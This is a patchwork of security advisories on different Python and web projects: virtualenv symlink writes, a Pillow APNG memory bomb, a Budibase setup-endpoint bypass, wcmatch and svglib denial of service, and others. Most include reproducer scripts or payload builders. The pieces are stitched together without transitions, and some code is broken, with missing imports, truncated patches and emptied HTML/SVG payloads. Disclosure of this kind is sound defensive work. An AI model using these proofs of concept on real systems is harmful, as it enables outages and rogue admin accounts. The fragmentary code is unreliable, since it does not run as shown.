cves.summary: Cross-site scripting (XSS) vulnerability in Fastream NETFile Server 6.0.3.588 allows remote attackers to inject arbitrary web script or HTML via the URL, which is displayed on a "404 Not Found" error page.

## Summary

Generated activation files and pyvenv.cfg can follow existing links and write outside the requested environment. The
template writer tests exists() before unlinking, which misses dangling symlinks; the configuration writer opens the
existing path directly.

Anthropic's OSS Scanner reported this as `ANT-2026-XBEOCBS1` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Final file entries written during environment creation and seeding.

## Attacker-controlled input

Another account must be able to prepare file links in the destination before creation. The invoking user must have write
permission at the linked target. The destination parent must remain controlled during creation; concurrent
parent-directory replacement is a separate concern.

## Affected code

The relevant 21.14.8 source is in
[template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py),
[configuration writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/pyenv_cfg.py).

## Mechanism

`ViaTemplateActivator._generate()` removes an existing output only when `Path.exists()` is true. A dangling symlink
therefore survives, and `write_bytes()` creates its target outside the environment. Other generated files have related
final-entry behavior. `PyEnvCfg.write()` opens `pyvenv.cfg` without first replacing an existing link; a symlink or hard
link there can overwrite an existing target. These paths require a prepared destination tree and the invoking user's
permission to write the linked target.

## Reproduction and evidence

The scanner's project tree contains `venv/bin/activate -> ../../../.bash_aliases` and an executable `venv/bin/basename`.
Before creation, a new interactive bash does not create the marker. A plain `virtualenv venv` writes the activation
script through the dangling link, creating `~/.bash_aliases` as a regular file. Debian's stock `.bashrc` sources that
file; the next interactive bash adds `venv/bin` to `PATH` and the planted `basename` writes the marker. The reproducer
checks that the link remains, `~/.bash_aliases` appears, and the second shell executes the planted file. A separate
manual check links `pyvenv.cfg` to `~/.bashrc` and observes the latter replaced with generated configuration text.

The link lets creation write outside the requested environment. The attacker chooses the target path but the generated
bytes come from virtualenv. The executable in the example was already in the prepared tree; this finding is not
arbitrary code injection into an otherwise trusted destination. The scanner traces the template behavior to #1454, first
released in 20.0.0b1. [PR #3431](https://github.com/pypa/virtualenv/pull/3431) replaces pre-existing output links and
uses exclusive creation for generated text. It does not make a destination safe if another account can replace parent
directories during creation.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared project tree
    participant V as virtualenv writer
    participant H as User home
    participant B as Next interactive bash
    A->>V: venv/bin/activate links to missing ~/.bash_aliases
    V->>V: Path.exists() follows link and returns false
    V->>H: write activation bytes through link
    H-->>B: ~/.bash_aliases now exists
    B->>H: .bashrc sources ~/.bash_aliases
    B->>A: PATH reaches planted venv/bin/basename
    A-->>B: marker created
    Note over V,H: pyvenv.cfg can also overwrite an existing linked target
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-XBEOCBS1`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import tempfile

# set up: a fresh home with Debian's stock ~/.bashrc, which sources ~/.bash_aliases when that file exists
home = tempfile.mkdtemp(prefix="home-")
shutil.copy("/etc/skel/.bashrc", f"{home}/.bashrc")
bash_aliases = f"{home}/.bash_aliases"
marker = f"{home}/attacker-ran"
open_terminal = ["bash", "-i", "-c", "true"]
terminal_env = {"HOME": home, "PATH": "/usr/bin:/bin", "TERM": "dumb"}

# the attacker's repository, cloned by the user to ~/proj
checkout = f"{home}/proj"
subprocess.run([sys.executable, "/tmp/repro.d/make_hostile_checkout.py", checkout], check=True)
activate = f"{checkout}/venv/bin/activate"
print("shipped: venv/bin/activate ->", os.readlink(activate), flush=True)

# a terminal opened before virtualenv runs does not touch the checkout (stderr: bash -i without a tty warns)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)
print("before virtualenv: ~/.bash_aliases exists:", os.path.lexists(bash_aliases), "| marker exists:", os.path.exists(marker), flush=True)
assert not os.path.lexists(bash_aliases) and not os.path.exists(marker)

# trigger: the user creates an environment in the checkout, then opens a new terminal
subprocess.run(["virtualenv", "--no-periodic-update", "venv"], cwd=checkout, env={**os.environ, "HOME": home}, check=True)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)

# check: the activation script belongs in venv/bin/activate; it must not be written through the link to ~/.bash_aliases
print("venv/bin/activate is still the symlink:", os.path.islink(activate))
written_outside = os.path.isfile(bash_aliases) and not os.path.islink(bash_aliases)
print("~/.bash_aliases created as a regular file:", written_outside)
if written_outside:
    print("  its first line:", open(bash_aliases).readline().rstrip())
attacker_code_ran = os.path.exists(marker)
print("after a new terminal, marker exists:", attacker_code_ran)
if attacker_code_ran:
    print("  it says:", open(marker).read().rstrip())
print("BUG" if written_outside and attacker_code_ran else "OK")
```

```text
import shutil
import sys

checkout = sys.argv[1]
bin_dir = os.path.join(checkout, "venv", "bin")
os.makedirs(bin_dir)
```

## Impact

Creation can overwrite or create files outside the requested environment with the invoking user's permissions. File
contents are constrained by what virtualenv generates.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix replaces existing entries, including symbolic and hard links, and exclusively creates generated text
files. Before stdlib creation it replaces executable-directory symlinks and Windows junctions with real directories. It
then removes symbolic and hard links inside that directory, including interpreter executables and DLLs, and at the
configuration and ignore file paths. This also removes unrelated links directly in the executable directory. Final
seed-launcher links are replaced. Exclusive creation protects the final text-file open; delegated stdlib and distlib
writes still require a destination protected from concurrent replacement.

Fix: [PR #3431](https://github.com/pypa/virtualenv/pull/3431).

## Known mitigation

Use a fresh destination beneath an owner-controlled parent. Avoid creation over a tree populated by another account.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-XBEOCBS1.

### Impact

The streaming decoder reparses an incomplete container from the beginning whenever another chunk arrives. A remote peer can split one valid MessagePack value across many small chunks, causing quadratic CPU usage and blocking the event loop.

### Patches

The decoder now preserves incremental container state so completed elements are not parsed again when more input arrives.

### Workarounds

Buffer each complete MessagePack value before decoding it, or limit the number of chunks accepted for a single value.

```
============================================================================
APNG background disposal allocates full canvas before decompression bomb check
Location: src/PIL/PngImagePlugin.py:1000  in PngImageFile._seek()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================
```

A 126-byte animated PNG file makes Pillow's `Image.open()` allocate and fill memory sized by the image dimensions the file claims, before Pillow's built-in check for oversized images runs. A file claiming 22000×22000 pixels costs about 1.9 GB. Anyone who can get an application to open an image they supply, with default settings and no further calls such as `load()`, can cause a multi-gigabyte memory spike per file. If the claimed size exceeds the machine's free memory, the operating system kills the process outright.

The bug is in `PngImageFile._seek()` in `src/PIL/PngImagePlugin.py` (around line 1000). For any APNG, `_open()` calls `self._seek(0)`. When the first `fcTL` chunk requests `OP_BACKGROUND` disposal, `_seek()` calls `Image.core.fill(self.mode, self.size)` with the full IHDR size, which allocates and zero-fills width×height×4 bytes. `OP_PREVIOUS` takes the same path, because frame 0 rewrites it to `OP_BACKGROUND`. This all happens inside the plugin factory, so `Image.open()`'s `_decompression_bomb_check(im.size)` only runs after the memory has been touched. A 1×1 frame rectangle passes the only checks on the way.

Below available memory, the allocation is freed when `DecompressionBombError` propagates, so sustained pressure needs repeated or concurrent uploads. A 45000×45000 header gets the process killed by the out-of-memory killer on an 8 GB host. The attached reproducer opens two such files that differ in one byte (`dispose_op` 0 vs 1). Both end in `DecompressionBombError`, but peak resident memory is 17 MB for the first and 1864 MB for the second. The eager fill was introduced in 5e4e0fa6ee67 ("Use disposal settings from previous frame", December 2020) and first shipped in 8.1.0. Two candidate patches with a regression test are attached.

## Details

For an APNG whose first `fcTL` chunk requests `OP_BACKGROUND` disposal, `PngImageFile._open()` creates and zero-fills a core image of the full IHDR-declared size. This happens inside the plugin factory, i.e. before `Image.open()` gets to `_decompression_bomb_check(im.size)`, so the check that is meant to reject oversized headers without allocating anything runs only after the allocation has been made and touched.

The following 126-byte file (all chunk lengths and CRCs valid) makes `Image.open(io.BytesIO(data))`, with default `MAX_IMAGE_PIXELS` and no `load()`, reach 1.86 GB resident (`ru_maxrss`) and then raise `DecompressionBombError`. The byte-identical file with `dispose_op=0` raises the same error at 17 MB.

```
IHDR  width=22000 height=22000 bit_depth=8 colour_type=6 (RGBA)
acTL  num_frames=2 num_plays=0
fcTL  seq=0 w=1 h=1 x=0 y=0 delay=1/10 dispose_op=1 (OP_BACKGROUND) blend_op=0
IDAT  zlib(00 00 00 00 00)                      # one 1x1 RGBA scanline
IEND
```

With `width=height=45000` (8.1 GB canvas) the same call attempts the full allocation: under a 4 GiB `RLIMIT_AS` it fails with `MemoryError` from the allocator instead of `DecompressionBombError`; without a cap, on an 8 GB host with no swap, the process is OOM-killed.

### Code path

`Image.open()` runs the bomb check only after the plugin's constructor (and therefore `_open()`) has returned:

```python
# src/PIL/Image.py:3699-3701
                    im = factory(fp, filename)
                    _decompression_bomb_check(im.size)
                    return im
```

For a plain PNG that ordering is fine: `PngImageFile._open()` only parses chunks up to the first `IDAT` and records `self._size` from `IHDR`; nothing is allocated from it. For an APNG (`acTL` seen, so `im_n_frames` is set) `_open()` additionally positions on frame 0:

```python
# src/PIL/PngImagePlugin.py:845-853
        if self.png.im_n_frames is not None:
            …
            self._seek(0)
```

`_seek(0)` copies `disposal` and `bbox` from the `fcTL` chunk into `self.dispose_op` / `self.dispose_extent` and then prepares the disposal image for the *next* frame eagerly, using the full image size:

```python
# src/PIL/PngImagePlugin.py:991-1001
        if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:
            self.dispose_op = Disposal.OP_BACKGROUND

        self.dispose = None
        if self.dispose_op == Disposal.OP_PREVIOUS:
            …
        elif self.dispose_op == Disposal.OP_BACKGROUND:
            self.dispose = Image.core.fill(self.mode, self.size)
            self.dispose = self._crop(self.dispose, self.dispose_extent)
```

`Image.core.fill` is `_fill()` in `src/_imaging.c:711`, which does `ImagingNewDirty(mode, xsize, ysize)` followed by `ImagingFill()`; `ImagingFill` (`src/libImaging/Fill.c:23`) writes every row, so the whole `width*height*4` bytes become resident rather than merely reserved. `self.size` here is the IHDR size (22000×22000), not the 1×1 frame rectangle. The `_crop` on the next line does call `_decompression_bomb_check`, but on the `fcTL` rectangle (1×1) and only after the fill has completed. Lines 991-992 rewrite `OP_PREVIOUS` to `OP_BACKGROUND` on frame 0, so `dispose_op=2` takes the same path (verified: identical 1.86 GB peak). When the first `fcTL` rectangle is large, the `_crop` copy is a second extent-sized buffer on top of the full-canvas fill, so the transient peak can reach about twice the canvas: a 13000×13000 full-frame `fcTL` (below the error threshold, so `Image.open()` succeeds with only a `DecompressionBombWarning`) peaks at 1.31 GB for a 0.66 GB canvas.

The only validation `chunk_fcTL` applies (`src/PIL/PngImagePlugin.py:740-745`) is that the frame rectangle fits inside the IHDR size, which a 1×1 frame always does; IHDR width/height themselves are unconstrained 32-bit values at this point. Control then returns to `_open_core`, `_decompression_bomb_check((22000, 22000))` raises, and the 1.9 GB core image is released when the half-constructed `PngImageFile` is discarded.

The eager full-size fill in `_seek()` was introduced in `5e4e0fa6ee67` ("Use disposal settings from previous frame", 2020-12-24) and first shipped in 8.1.0; before it, the `OP_BACKGROUND` fill lived in `load_end()` and could not be reached from `Image.open()`.

## Impact

Any application that calls `Image.open()` on untrusted bytes with default settings — the configuration in which the decompression-bomb check is supposed to make that call cheap and safe — can be made to allocate and write an attacker-chosen amount of memory from a ~126-byte PNG upload, before any error is reported and without `load()`, frame iteration, or `LOAD_TRUNCATED_IMAGES`. The amount is set directly by the IHDR width/height (4 bytes per pixel for colour type 6): values below the host's free memory cause a transient multi-GB spike per request (≈15,000,000× amplification at 22000×22000) that is freed when the exception propagates, so concurrent or repeated uploads are needed to sustain pressure; values above it get the worker process OOM-killed outright. PNG is accepted by essentially every upload pipeline, and the file passes `_accept` and chunk CRC checks as a well-formed APNG.

This is the same class as the recent bomb-check additions for WMF (load at a different DPI), FITS, GIF and FontFile — an allocation sized from file-declared numbers on a path `_decompression_bomb_check` does not cover — but here the uncovered path is `Image.open()` itself rather than a later `load()`/`seek()`.

## Reproducing

`repro` is a single Python script (no build step, no companion files). It builds two PNGs in memory, opens each one with plain `Image.open(io.BytesIO(data))` in a fresh child interpreter using default settings and no `load()`, and has each child report the exception it got and its own peak RSS (`ru_maxrss`). It needs about 2 GB of free RAM and finishes in about a second.

The two files are 126 bytes each and differ in exactly one byte, the `dispose_op` of the first `fcTL` chunk: `0` (`OP_NONE`) for the control and `1` (`OP_BACKGROUND`) for the attack. Both declare IHDR 22000×22000 RGBA. That is 484 Mpixel, above the 2×`MAX_IMAGE_PIXELS` error threshold, so `Image.open()` has to reject both with `DecompressionBombError`. Each chunk has a job:

- The `acTL` chunk (2 frames) makes `_open()` call `_seek(0)`.
- The 1×1 `fcTL` rectangle passes `chunk_fcTL`'s bounds check and `_crop`'s bomb check.
- The one-scanline `IDAT` ends header parsing.

Expected output on this tree:

```
126-byte APNG declaring 22000x22000 RGBA; Image.open(BytesIO(data)), defaults
  control  dispose_op=0 OP_NONE        -> DecompressionBombError peak RSS    17 MB
  attack   dispose_op=1 OP_BACKGROUND  -> DecompressionBombError peak RSS  1864 MB
Image.open() touched a full 22000x22000 canvas before the bomb check ran
BUG
```

Both files are rejected, but the control is rejected at interpreter size. The attack file only reaches the bomb check after `Image.core.fill("RGBA", (22000, 22000))` has allocated and zero-filled about 1.9 GB. The script prints `BUG` if the attack child's peak RSS is at least 1000 MB and at least 20× the control's, or if the attack child is killed by `SIGKILL` (for example by the OOM killer on a small host). Otherwise it prints `OK`; any other non-zero child exit is treated as a harness failure, printed with the child's output, and also ends in `OK`. With either attached patch applied, both children report about 17–22 MB and the script prints `OK`.

The allocation grows with the header, so it can be scaled by changing `SIZE` in the script. The 45000×45000 case (an 8.1 GB canvas) is covered in Details and is not part of the script.

## Suggested fix

Do not build the `OP_BACKGROUND` disposal image from the declared size during `_open()`. Two alternative patches are attached; both change only `src/PIL/PngImagePlugin.py`, and both add the same regression test to `Tests/test_file_apng.py` (a 2³¹−1 × 1 APNG built in memory with a 1×1 `OP_BACKGROUND` first frame must make `Image.open()` raise `DecompressionBombError`; on the current tree the fill fails first with `MemoryError`). Attached patch 1 is the preferred fix.

**Attached patch 1** moves the fill to its only point of use, the `frame > 0` branch of `_seek()` right after `self.load()` — which can only run once `Image.open()` has returned (bomb check passed) and the canvas itself has been allocated — and, as `GifImagePlugin` already does, fills only the previous frame's dispose extent instead of a full canvas that is then cropped:

```diff
a/src/PIL/PngImagePlugin.py
+++ b/src/PIL/PngImagePlugin.py
@@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):
             # ensure previous frame was loaded
             self.load()
 
+            if self.dispose_op == Disposal.OP_BACKGROUND:
+                # Created here rather than in the previous _seek(), so that
+                # nothing is allocated from the declared image size before
+                # the decompression bomb check in Image.open() has run.
+                # Only dispose the extent of the previous frame.
+                x0, y0, x1, y1 = self.dispose_extent
+                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))
             if self.dispose:
                 self.im.paste(self.dispose, self.dispose_extent)
             self._prev_im = self.im.copy()
@@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):
             if self._prev_im:
                 self.dispose = self._prev_im.copy()
                 self.dispose = self._crop(self.dispose, self.dispose_extent)
-        elif self.dispose_op == Disposal.OP_BACKGROUND:
-            self.dispose = Image.core.fill(self.mode, self.size)
-            self.dispose = self._crop(self.dispose, self.dispose_extent)
```

At that point `self.dispose_op` and `self.dispose_extent` still hold the previous frame's values (they are reassigned further down in `_seek`), so disposal semantics are unchanged; the `OP_PREVIOUS` copy stays eager because `load_end()` pastes into `_prev_im` in place (`src/PIL/PngImagePlugin.py:1110`). With this patch `Image.open()` allocates nothing from the declared size, including in the `DecompressionBombWarning` range.

**Attached patch 2** is a smaller diff that keeps the eager disposal setup in `_seek()` and mirrors `GifImagePlugin._seek()`'s `OP_BACKGROUND` handling exactly: it computes the size of the `fcTL` rectangle (already validated by `chunk_fcTL` to lie within the image), runs `Image._decompression_bomb_check()` on it, and fills an image of only that size instead of filling `self.size` and cropping. It also narrows the `dispose_extent` annotation to `tuple[int, int, int, int]` so the bomb-check call type-checks. The trade-off is that a full-canvas first frame still allocates a bomb-checked image inside `Image.open()` — up to about 2×`MAX_IMAGE_PIXELS`×4 bytes (660 MB for a 13000×13000 full-frame `fcTL`, with `DecompressionBombWarning`) — and a first `fcTL` covering a canvas above the error threshold now raises `DecompressionBombError` from `_seek(0)` rather than from `Image.open()`'s own check.

With either patch applied to a clean checkout, the reproducer prints `OK` and all 54 files in `Tests/images/apng/` decode byte-identically frame by frame, including after a rewind.

## The patch (1 of 2)

Create the APNG OP_BACKGROUND disposal image when the next frame is sought, sized to the frame extent, not in _open() from the IHDR size

Applies to `src/PIL/PngImagePlugin.py` at the commit above.

```diff
diff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py
index 15689476c..6e61c8b4b 100644
a/Tests/test_file_apng.py
+++ b/Tests/test_file_apng.py
@@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -> None:
         assert im.size == (128, 64)
```

```python
    attack:  dispose_op = 1  (OP_BACKGROUND)

file, PngImageFile._open() -> _seek(0) first runs

import struct
import subprocess
import sys
import zlib

SIZE = 22000  # 22000 * 22000 * 4 bytes = 1.94 GB canvas

def chunk(cid, data):
    crc = zlib.crc32(cid + data)
    return struct.pack(">I", len(data)) + cid + data + struct.pack(">I", crc)

def build_apng(dispose_op):
    ihdr = struct.pack(">IIBBBBB", SIZE, SIZE, 8, 6, 0, 0, 0)  # 8-bit RGBA
    actl = struct.pack(">II", 2, 0)  # animated: 2 frames -> _open() calls _seek(0)
    # frame 0: seq 0, a 1x1 rectangle at (0,0) (passes fcTL's bounds check),
    # delay 1/10 s, the dispose_op under test, blend_op 0
    fctl = struct.pack(">IIIIIHHBB", 0, 1, 1, 0, 0, 1, 10, dispose_op, 0)
    idat = zlib.compress(b"\x00" + b"\x00\x00\x00\x00")  # one 1x1 RGBA scanline
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"acTL", actl)
            + chunk(b"fcTL", fctl) + chunk(b"IDAT", idat) + chunk(b"IEND", b""))

# settings, no load(). Prints the outcome and this process's peak RSS in MB.

try:

    outcome = "opened"
except Exception as e:
    outcome = type(e).__name__
print(outcome, resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024)
```

## Description

### Summary

On a self-hosted, single-tenant Budibase instance (`multiTenancy:false`), the public bootstrap endpoint `POST /api/global/users/init` remains fully exploitable **after** the instance has been provisioned. Its "already initialised" guard (`checkAnyUserExists()`) is evaluated inside a **tenant-scoped** database context derived from an **attacker-controlled `tenantId`** in the request body. Because the tenancy layer never constrains that `tenantId` to the only legitimate tenant (`default`) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (`<tenantId>_global-db`) and a **global-admin** user document (`admin.global = true`, `builder.global = true`) inside it - with no authentication and no CSRF token.

This is (a) a bypass of the security control meant to permanently close first-run setup, and (b) an unauthenticated, persistent write primitive that lets an anonymous attacker create an unbounded number of databases and admin-user documents - a resource-exhaustion / denial-of-service vector against the CouchDB datastore, plus creation of latent rogue admin accounts.

### Details

Root cause chain (source, tag v3.44.0):

1. `packages/worker/src/api/index.ts:41` - `POST /api/global/users/init` is in `PUBLIC_ENDPOINTS`, so `auth.buildAuthMiddleware(PUBLIC_ENDPOINTS)` marks it `publicEndpoint` and the "no public access to worker" gate (`api/index.ts:159-165`) lets it through **without any session**. It is also in `NO_TENANCY_ENDPOINTS` (`api/index.ts:83`), so the tenancy middleware does **not** pin the request to `default` - the tenant is taken verbatim from the request body - and in `NO_CSRF_ENDPOINTS`.
2. `packages/worker/src/middleware/cloudRestricted.ts:10,25` - the `cloudRestricted` guard only enforces the internal API key when `!env.SELF_HOSTED && !env.DISABLE_ACCOUNT_PORTAL`. On a self-hosted instance (`SELF_HOSTED=true`) it is a **no-op** (`return next()`), so `cloudRestrictedRoutes` provides no protection here.
3. `packages/worker/src/api/routes/global/users.ts:69-79` - `cloudRestrictedRoutes.post("/api/global/users/init", … controller.adminUser)`.
4. `packages/worker/src/api/controllers/global/users.ts:232` - the handler runs `await tenancy.doInTenant(tenantId, …)` using the **attacker-supplied** `tenantId`.
5. `packages/worker/src/api/controllers/global/users.ts:238` - the only guard, `const userExists = await checkAnyUserExists()`, throws 403 only if a user exists **in the current tenant context**.
6. `packages/worker/src/utilities/users.ts:3-15` - `checkAnyUserExists()` calls `tenancy.getGlobalDB()`, which resolves to `<tenantId>_global-db`. The defect is **incorrect authorization scoping**: the single-tenant deployment invariant ("only tenant `default` exists; init is one-time") is never enforced against the request-supplied `tenantId`, so the guard is evaluated against a namespace the attacker chooses.

# Summary

With default flags, a pattern that contains several `*` wildcards takes polynomial time, O(n^k) for k stars, to reject a crafted file name. The pattern is an ordinary developer constant such as `*_*_*_*_*.csv`; only the string being matched comes from the attacker. A 255-byte file name (the maximum on common filesystems) takes 73 s with `fnmatch.fnmatch()` and 86 s with `glob.globmatch()`. The standard library's `fnmatch` handles the same input in under a millisecond.

This is different from GHSA-84v8-qmgq-9g88: that advisory covers extglob patterns, while this case needs no flags and no attacker-controlled pattern.

# Details

Every `*` is translated to a lazy `.*?` (`_STAR`, `wcmatch/_wcparse.py:212`; `_PATH_STAR` `[^/]*?`, `:218`), which is emitted in `_handle_star` (`:1405-1424`):

```text
*_*_*_*_*.csv  ->  ^(?s:(?=.)(?![.]).*?_.*?_.*?_.*?_.*?\.csv)$
```

When the subject consists of many `_` and does not end in `.csv`, the regex engine tries every way of splitting it between the stars. CPython fixed the same problem in its own `fnmatch` (bpo-40480) by making every star segment except the last one atomic.

# PoC

```python
import time, fnmatch as std
from wcmatch import fnmatch, glob

for pat, n in [('*_*_*_*.csv', 255), ('*_*_*_*.csv', 400), ('*_*_*_*_*.csv', 150),
               ('*_*_*_*_*.csv', 200), ('*_*_*_*_*.csv', 255)]:
    name = '_' * n
    t = time.perf_counter(); fnmatch.fnmatch(name, pat); w = time.perf_counter() - t
    t = time.perf_counter(); std.fnmatchcase(name, pat); s = time.perf_counter() - t
    print(f'{pat:15} len={n}  wcmatch={w:.3f}s  stdlib={s:.5f}s')

t = time.perf_counter(); glob.globmatch('uploads/' + '_' * 255, 'uploads/*_*_*_*_*.csv')
print(f'globmatch {time.perf_counter() - t:.2f}s')
```

wcmatch 11.1, CPython 3.13, macOS:

```text
*_*_*_*.csv     len=255  wcmatch=1.412s   stdlib=0.00001s
*_*_*_*.csv     len=400  wcmatch=8.599s   stdlib=0.00004s
*_*_*_*_*.csv   len=150  wcmatch=5.333s   stdlib=0.00003s
*_*_*_*_*.csv   len=200  wcmatch=22.415s  stdlib=0.00007s
*_*_*_*_*.csv   len=255  wcmatch=72.732s  stdlib=0.00047s
globmatch 85.75s
```

`glob.glob('*_*_*_*.csv', root_dir=d)` on a real directory that contains one file named `'_' * 255` takes 1.7 s.

# Impact

Applications that match untrusted names against multi-star patterns can be blocked on a single CPU core for minutes per name. Examples: upload handlers, archive or object-store key filters, and `glob`/`WcMatch` scans of directories where other users can create files. No authentication is needed.

# Fix

Emit every star segment except the last one as an atomic group, as the standard library does. On Python 3.11 and later use `(?>.*?_)`; on 3.10 use the lookahead/backreference form from `fnmatch._join_translated_parts`. For example:

```text
^(?s:(?=.)(?![.])(?>.*?_)(?>.*?_)(?>.*?_)(?>.*?_).*?\.csv)$
```

This rejects the 255-byte name in under 1 ms. On my spot-check inputs it gives the same results as the current regex. The same change applies to `_PATH_STAR`.

# Summary Every sibling `` adds another level of the parent's indentation, so the size of `get_text()` output grows quadratically with the number of tables. In the measurements below, a 240 KB HTML document produces about 1 billion characters and uses about 1 GB of memory. # Details `table_end_handler()` (`model/tag/table_tag.py`) writes the rendered table into the parent element with `HtmlElement.write_verbatim_text()` (`model/html_element.py`). For a block-level parent, `write_verbatim_text()` calls `canvas.open_block()`, which pushes the parent's `padding_inline` onto the prefix stack. The following `close_block()` never pops it; only `Canvas.close_tag()` calls `prefix.remove_last_prefix()`. So each table leaves one extra padding entry on the stack. This has been present since 2.0 (commit 84ec720). ```python >>> get_text('
    ' + '
a
' * 4 + '') ' a\n \n a\n \n a\n \n a\n ' ``` # PoC ```python import sys, time, resource from inscriptis import get_text n = int(sys.argv[1]) html = "
    " + "
    " * n + "
" t = time.time(); out = get_text(html) print(len(html), f"{time.time()-t:.2f}s", len(out), resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 2**20, "MiB") ``` inscriptis 2.7.5, Python 3.11, macOS (2.0.0 behaves the same): | tables | HTML | time | output chars | peak RSS | |---|---|---|---|---| | 1,000 | 15 KB | 0.02 s | 4.0 M | 31 MiB | | 4,000 | 60 KB | 0.33 s | 64 M | 154 MiB | | 8,000 | 120 KB | 1.31 s | 256 M | 463 MiB | | 16,000 | 240 KB | 5.63 s | 1,024 M | 991 MiB | When the input doubles, output size and memory grow about 4 times. # Impact Any application that converts untrusted HTML with inscriptis can be made to exhaust memory with a small document. This includes crawlers, RAG and LLM ingestion pipelines, and `inscriptis-api`. No authentication and no user interaction are needed. # Fix ```diff self.canvas.write(self, text, whitespace=WhiteSpace.pre) if self.display == Display.block: + self.canvas.current_block.prefix.remove_last_prefix() self.canvas.close_block(self) ``` With this change the 240 KB input above produces 288 K characters in 0.14 s with 27 MiB peak RSS. A single table renders exactly as before, and the existing test suite passes.

# Summary `svg2rlg()` expands `` references without any limit on the total number of expansions. Only direct cycles are rejected (`CircularRefError`). A group containing N `` elements that point to another such group multiplies the work by N per nesting level, so an SVG of about 1.4 KB makes svglib clone and render over 100,000 nodes, taking tens of seconds of CPU time and hundreds of MiB of memory. Each additional level adds about 245 bytes to the document and multiplies time by ~10. This is the SVG `` variant of the XML "billion laughs" attack (the same class as librsvg CVE-2019-20446). # Details `SvgRenderer.renderUse()` in `src/svglib/svglib.py`: ```python try: item = self.xlink_href_target(node, group=group) except CircularRefError: node.parent.etree_element.remove(node.etree_element) return group ... if len(node.getchildren()) == 0: # Append a copy of the referenced node as the child (if not # already done) node.append(copy.deepcopy(item)) self.renderNode(list(node.iter_children())[-1], parent=group) ``` The referenced node is deep-copied under the `` element and rendered. Any `` elements inside the copied subtree go through `renderUse()` again. `xlink_href_target()` raises `CircularRefError` only for a direct cycle, so a reference DAG with fan-out is expanded fully: `fan ** levels` renders. Payload shape (fan = 10, levels = 5): ```xml ``` # Impact Denial of service (CPU and memory exhaustion) for any application that renders SVG from an untrusted source with svglib: thumbnail/preview generation, SVG-to-PDF conversion, report generation. Only the SVG document needs to be attacker-controlled; no non-default option is required. The same happens through `xhtml2pdf`, which depends on svglib to render SVG images. An HTML document containing `` passed to `pisa.CreatePDF()` triggers the expansion. HTML-to-PDF conversion of user-supplied content is a common use of xhtml2pdf in web applications. # Reproduction Minimal local PoC, non-destructive: ```python import io, time from svglib.svglib import svg2rlg def make(levels, fan=10): parts = ['') return "".join(parts).encode() for levels in (3, 4, 5): data = make(levels) t = time.time() svg2rlg(io.BytesIO(data)) print(levels, len(data), f"{time.time() - t:.1f}s") ``` Result on svglib 2.3.0 (commit `5d28646`), Python 3.12, macOS: | levels | SVG size | time | peak RSS | |---|---|---|---| | 3 | 919 B | 0.3 s | 42 MiB | | 4 | 1164 B | 2.9 s | 83 MiB | | 5 | 1409 B | 34 s | 469 MiB | svglib 1.5.1 from PyPI behaves the same (levels = 4: 2.8 s, 82 MiB). Through xhtml2pdf 0.2.23 with the same SVG embedded as a `data:` URI ``: | levels | HTML size | time | peak RSS | |---|---|---|---| | 4 | 1626 B | 6.9 s | 133 MiB | | 5 | 1954 B | 78.7 s | 499 MiB | # Suggested fix Count `` expansions per document and stop expanding beyond a fixed limit: ```diff @@ src/svglib/svglib.py # A sentinel to identify a situation where a node reference a fragment not yet defined. DELAYED = object() +# Upper bound on the number of elements expanded while rendering one document. +# Nested references multiply (a few hundred bytes can expand to millions of +# nodes), so rendering stops expanding elements beyond this limit. +MAX_USE_EXPANSIONS = 10_000 + @@ class SvgRenderer: self._external_svgs: dict[str, ExternalSVG] = {} + self._use_expansions = 0 self.attrConverter.css_rules = CSSMatcher() @@ def renderUse( if group is None: group = Group() + self._use_expansions += 1 + if self._use_expansions > MAX_USE_EXPANSIONS: + if self._use_expansions == MAX_USE_EXPANSIONS + 1: + logger.error( + "Too many expansions (limit is %d), skipping the rest", + MAX_USE_EXPANSIONS, + ) + return group + try: item = self.xlink_href_target(node, group=group) ``` With the fix, a 6-level payload (1654 B, one million expansions without the limit) renders in 1.1 s with 64 MiB peak RSS. The limit value is a suggestion; 10,000 `` elements is far above what normal documents (icon sprites, symbol libraries) need. # Regression test A regression test `TestUseNode::test_use_nested_expansion_is_bounded` in `tests/test_basic.py` renders the 5-level payload and asserts it finishes within 10 seconds. * Without fix: test fails (30.9 s). * With fix: test passes (1.8 s). `python -m pytest tests/test_basic.py tests/test_units.py tests/test_external_references.py tests/test_fonts.py -q` → **190 passed, 4 skipped**. No regressions. I'm happy to share the full patch (including the test), for example as a PR on a temporary private fork of this advisory. # Affected versions `<= 2.3.0` (verified on 2.3.0 and 1.5.1)

